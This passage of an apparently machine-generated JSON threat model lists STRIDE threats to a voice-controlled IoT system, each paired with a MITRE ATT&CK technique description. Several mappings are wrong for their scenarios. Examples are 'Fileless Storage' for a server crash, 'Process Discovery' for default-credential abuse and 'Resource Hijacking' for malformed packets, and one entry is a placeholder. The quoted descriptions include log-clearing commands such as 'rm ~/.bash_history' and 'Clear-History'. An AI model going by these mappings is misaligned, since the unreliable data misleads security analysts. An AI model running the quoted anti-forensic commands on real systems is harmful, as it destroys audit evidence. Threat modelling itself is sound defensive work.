                    "Assumption": "The attacker can gain access to the client-side application source code or binaries.",
                    "Role": "Attacker",
                    "Condition": "Valid when supply chain or local device security is weak."
                },
                {
                    "Assumption": "The client application runs with permissions that allow it to handle sensitive data.",
                    "Role": "System",
                    "Condition": "Valid when application permissions are overly broad."
                },
                {
                    "Assumption": "Regular application integrity checks are not in place.",
                    "Role": "System",
                    "Condition": "Valid when tampering remains unnoticed."
                }
            ],
            "Potential Impact": "Unauthorized data collection leading to privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "software tampering",
                "client-side",
                "data collection",
                "privacy breach"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the audio responses sent by the server to mislead users into taking inappropriate actions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and alter server responses.",
                    "Role": "Attacker",
                    "Condition": "Valid when network transmission lacks encryption."
                },
                {
                    "Assumption": "The client application does not verify the integrity of audio responses.",
                    "Role": "System",
                    "Condition": "Valid when integrity verification mechanisms are absent."
                },
                {
                    "Assumption": "Users trust the audio responses without additional validation.",
                    "Role": "User",
                    "Condition": "Valid when there is a high level of trust in the system."
                }
            ],
            "Potential Impact": "Users may take actions based on falsified information.",
            "MITRE ATT&CK Keywords": [
                "audio tampering",
                "server responses",
                "misleading information",
                "user actions"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a specific voice command that triggered a critical action on an IoT device.",
            "Assumptions": [
                {
                    "Assumption": "Voice command logging is insufficient or inconsistent.",
                    "Role": "System",
                    "Condition": "Valid when comprehensive logging is not enforced."
                },
                {
                    "Assumption": "There are no mechanisms for verifying user identity in voice commands.",
                    "Role": "System",
                    "Condition": "Valid when voice recognition lacks uniqueness."
                },
                {
                    "Assumption": "Users can plausibly deny their actions due to lack of proof.",
                    "Role": "User",
                    "Condition": "Valid when activity logs are absent or unclear."
                }
            ],
            "Potential Impact": "Difficulty in holding users accountable for actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "voice commands",
                "action denial",
                "IoT device control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An authorized user denies having altered sensitive settings within the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "Audit logs do not capture detailed change histories.",
                    "Role": "System",
                    "Condition": "Valid when logging mechanisms are inadequate."
                },
                {
                    "Assumption": "Critical actions within the IoT controller are not clearly attributed to specific users.",
                    "Role": "System",
                    "Condition": "Valid when there's lack of user-specific logging."
                },
                {
                    "Assumption": "Users have access levels that permit critical changes.",
                    "Role": "User",
                    "Condition": "Valid when access controls are overly permissive."
                }
            ],
            "Potential Impact": "Untraceable changes hinder forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "access denial",
                "audit log",
                "IoT controller",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker logs in using stolen credentials and performs actions that cannot be traced back to them.",
            "Assumptions": [
                {
                    "Assumption": "User credential theft is possible via phishing or other tactics.",
                    "Role": "Attacker",
                    "Condition": "Valid when credential security is insufficient."
                },
                {
                    "Assumption": "The system does not have multi-factor authentication (MFA) mechanisms.",
                    "Role": "System",
                    "Condition": "Valid when additional authentication mechanisms are not employed."
                },
                {
                    "Assumption": "Action traceability is weak or non-existent.",
                    "Role": "System",
                    "Condition": "Valid when log attribution is deficient."
                }
            ],
            "Potential Impact": "Stolen credentials lead to actions that cannot be traced back to the attacker.",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "action denial",
                "traceability",
                "identification"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user information sent to the cloud is intercepted by an unauthorized entity.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "System",
                    "Condition": "Valid when data transmission lacks encryption protocols."
                },
                {
                    "Assumption": "The attacker has the capability to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid when network security is compromised."
                },
                {
                    "Assumption": "Sensitive information is stored or processed in the cloud.",
                    "Role": "System",
                    "Condition": "Valid when cloud storage or services are used."
                }
            ],
            "Potential Impact": "Exposure of user data compromising privacy.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "cloud",
                "sensitive information",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An employee with access to server logs extracts and discloses user interactions and sensitive commands.",
            "Assumptions": [
                {
                    "Assumption": "Employees can access sensitive server logs.",
                    "Role": "System",
                    "Condition": "Valid when access controls are inadequate."
                },
                {
                    "Assumption": "Logs contain sensitive user interactions and commands.",
                    "Role": "System",
                    "Condition": "Valid when logs are detailed."
                },
                {
                    "Assumption": "There are no strict monitoring and auditing processes for log access.",
                    "Role": "System",
                    "Condition": "Valid when log access is not tightly controlled."
                }
            ],
            "Potential Impact": "Leakage of sensitive interactions may harm user trust and privacy.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "log extraction",
                "sensitive data",
                "privacy"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to cloud-stored user data through a compromised API key.",
            "Assumptions": [
                {
                    "Assumption": "API keys are exposed, weak, or not regularly rotated.",
                    "Role": "System",
                    "Condition": "Valid when API key management practices are poor."
                },
                {
                    "Assumption": "Sensitive data is accessible using the compromised API key.",
                    "Role": "System",
                    "Condition": "Valid when API access controls are insufficient."
                },
                {
                    "Assumption": "Attackers can exploit compromised API keys.",
                    "Role": "Attacker",
                    "Condition": "Valid when API keys are discovered or brute-forced."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user information stored in the cloud.",
            "MITRE ATT&CK Keywords": [
                "API compromise",
                "cloud storage",
                "sensitive data",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the client-server communication channel with fake voice commands, disrupting normal operation.",
            "Assumptions": [
                {
                    "Assumption": "The system does not have rate limiting or robust filtering for voice commands.",
                    "Role": "System",
                    "Condition": "Valid when there's a lack of traffic control mechanisms."
                },
                {
                    "Assumption": "The attacker has the capability to generate and send large volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid when the attacker can script or automate traffic generation."
                },
                {
                    "Assumption": "Network channels are vulnerable to high traffic volumes.",
                    "Role": "System",
                    "Condition": "Valid when network infrastructure is not resilient."
                }
            ],
            "Potential Impact": "Service disruption affects system availability.",
            "MITRE ATT&CK Keywords": [
                "traffic flooding",
                "service disruption",
                "network",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious entity sends invalid data packets to the IoT controller, causing it to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller does not sanitize input data sufficiently.",
                    "Role": "System",
                    "Condition": "Valid when input validation mechanisms are weak."
                },
                {
                    "Assumption": "The attacker can send data packets to the IoT controller.",
                    "Role": "Attacker",
                    "Condition": "Valid when network access is possible."
                },
                {
                    "Assumption": "The system does not have robust error-handling mechanisms.",
                    "Role": "System",
                    "Condition": "Valid when error-handling is inadequately implemented."
                }
            ],
            "Potential Impact": "IoT devices become unresponsive, impacting services.",
            "MITRE ATT&CK Keywords": [
                "data injection",
                "IoT controller",
                "service availability",
                "unresponsiveness"
            ],
            "mitre_technique": {
                "name": "Resource Hijacking",
                "description": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)\n\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it\u2019s not competing for resources.(Citation: Trend Micro War of Crypto Miners)\n\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR) Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.(Citation: Sysdig Proxyjacking)",
                "id": "attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783",
                "technique_id": "T1496"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An adversary exploits vulnerabilities in the server-side application to crash the system.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist within the server application.",
                    "Role": "System",
                    "Condition": "Valid when there are unpatched or unknown flaws."
                },
                {
                    "Assumption": "The attacker has the capability to deliver crafted payloads to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid when attack surface is exposed."
                },
                {
                    "Assumption": "There are no mitigating controls such as application firewalls or intrusion detection systems.",
                    "Role": "System",
                    "Condition": "Valid when security layers are insufficient."
                }
            ],
            "Potential Impact": "System crash leads to service unavailability.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "server crash",
                "system unavailability",
                "payload"
            ],
            "mitre_technique": {
                "name": "Fileless Storage",
                "description": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless)\n\nSimilar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation: Microsoft Fileless) ",
                "id": "attack-pattern--02c5abff-30bf-4703-ab92-1f6072fae939",
                "technique_id": "T1027.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user exploits a flaw in the client-side application to gain administrative access to the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "The client application has a security flaw that can be exploited.",
                    "Role": "System",
                    "Condition": "Valid when application security is not robust."
                },
                {
                    "Assumption": "The attacker can interact with the system to leverage this flaw.",
                    "Role": "Attacker",
                    "Condition": "Valid when attacker can access the application interface."
                },
                {
                    "Assumption": "Access controls on the IoT controller are insufficient.",
                    "Role": "System",
                    "Condition": "Valid when privilege boundaries are weak."
                }
            ],
            "Potential Impact": "Unauthorized administrative access to critical IoT operations.",
            "MITRE ATT&CK Keywords": [
                "application exploit",
                "privilege escalation",
                "IoT controller",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An external attacker uses a zero-day vulnerability in the server to gain elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "A zero-day vulnerability exists within the server application.",
                    "Role": "System",
                    "Condition": "Valid when undiscovered or unpatched vulnerabilities are present."
                },
                {
                    "Assumption": "The attacker is capable of identifying and exploiting such vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid when attacker has advanced skills and resources."
                },
                {
                    "Assumption": "System monitoring and threat detection do not effectively identify such exploits.",
                    "Role": "System",
                    "Condition": "Valid when detection mechanisms are weak."
                }
            ],
            "Potential Impact": "Gaining unauthorized control over the server impacts system integrity.",
            "MITRE ATT&CK Keywords": [
                "zero-day exploit",
                "server vulnerability",
                "privilege escalation",
                "control"
            ],
            "mitre_technique": {
                "name": "Extra Window Memory Injection",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
                "technique_id": "T1055.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits weak or default credentials on the IoT controller to gain higher-level access.",
            "Assumptions": [
                {
                    "Assumption": "Default credentials are not changed or are easily guessable.",
                    "Role": "System",
                    "Condition": "Valid when security best practices are not followed."
                },
                {
                    "Assumption": "Attacker has means to attempt credential guessing or brute forcing.",
                    "Role": "Attacker",
                    "Condition": "Valid when system allows multiple login attempts."
                },
                {
                    "Assumption": "No additional security measures like MFA are employed.",
                    "Role": "System",
                    "Condition": "Valid when access controls are minimal."
                }
            ],
            "Potential Impact": "Elevated access allows for full control of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "credential guessing",
                "default password",
                "IoT control",
                "elevated access"
            ],
            "mitre_technique": {
                "name": "Process Discovery",
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)",
                "id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
                "technique_id": "T1057"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "3",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate user to manipulate IoT devices through voice commands.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a recording of the user's voice.",
                    "Role": "Attacker",
                    "Condition": "Legitimate user voice recording obtained."
                },
                {
                    "Assumption": "The system lacks robust voice verification mechanisms.",
                    "Role": "System",
                    "Condition": "Weak or no voice authentication in place."
                },
                {
                    "Assumption": "The attacker is within the proximity of the microphone to issue commands.",
                    "Role": "Attacker",
